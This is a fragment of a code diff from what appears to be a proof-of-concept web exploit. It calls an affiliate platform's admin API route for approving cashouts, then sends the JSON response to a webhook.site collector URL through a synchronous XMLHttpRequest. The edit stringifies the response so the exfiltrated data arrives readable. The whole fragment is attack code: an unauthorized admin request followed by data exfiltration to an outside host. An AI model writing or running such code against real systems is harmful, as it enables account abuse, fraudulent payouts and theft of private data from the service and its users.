@@ -10,9 +10,9 @@ fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/appro
 })
 .then(response => {
   a = response.json(); // Parse the JSON response from the server
-
+ const jsonString = JSON.stringify(a );
   var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+a, false ); // false for synchronous request
+    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?a="+jsonString, false ); // false for synchronous request
     xmlHttp.send( null );
     return xmlHttp.responseText;
 })
